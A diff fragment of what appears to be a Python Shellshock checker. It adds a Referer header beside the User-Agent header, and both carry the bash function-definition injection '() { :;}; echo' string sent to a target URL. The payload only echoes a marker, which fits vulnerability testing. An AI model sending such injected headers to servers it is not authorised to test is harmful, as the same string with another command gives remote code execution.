@@ -14,7 +14,10 @@ def main(argv):
 
     url = sys.argv[1]
 
-    headers = {"User-Agent": "() { :;}; echo 'shellshocked!",}
+    headers = {
+               "User-Agent": "() { :;}; echo 'shellshocked!",
+               "Referer": "() { :;}; echo 'shellshocked!"
+              }
     
     try:
         r = requests.get(url, headers=headers)
